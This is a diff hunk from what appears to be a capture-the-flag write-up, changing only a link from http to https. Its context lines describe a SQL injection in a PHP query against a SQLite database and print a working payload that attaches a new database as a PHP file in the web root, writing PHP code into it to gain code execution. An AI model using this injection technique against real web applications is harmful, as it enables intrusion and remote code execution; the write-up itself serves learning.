@@ -210,7 +210,7 @@ else
 ?>
 ```
 
-We have a sqlite database that is clearly vulnerable to sql injection in the query `"SELECT * FROM books WHERE id=".$bookid;`. After researching a bit weather we can do something with sql injection on sqlite databases, this blog [post](http://atta.cked.me/home/sqlite3injectioncheatsheet) describes a very interesting technique to get code execution. Sqlite lets us attach a new database that will be created as a file on the file system with content we control! After playing for a while the following query does the trick:
+We have a sqlite database that is clearly vulnerable to sql injection in the query `"SELECT * FROM books WHERE id=".$bookid;`. After researching a bit weather we can do something with sql injection on sqlite databases, this blog [post](https://atta.cked.me/home/sqlite3injectioncheatsheet) describes a very interesting technique to get code execution. Sqlite lets us attach a new database that will be created as a file on the file system with content we control! After playing for a while the following query does the trick:
 
 ```
  or 1=1;attach database '/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/xct.php' as xct;create table xct.pwn (dataz text);insert into xct.pwn (dataz) values ("<?php phpinfo(); ?>");--
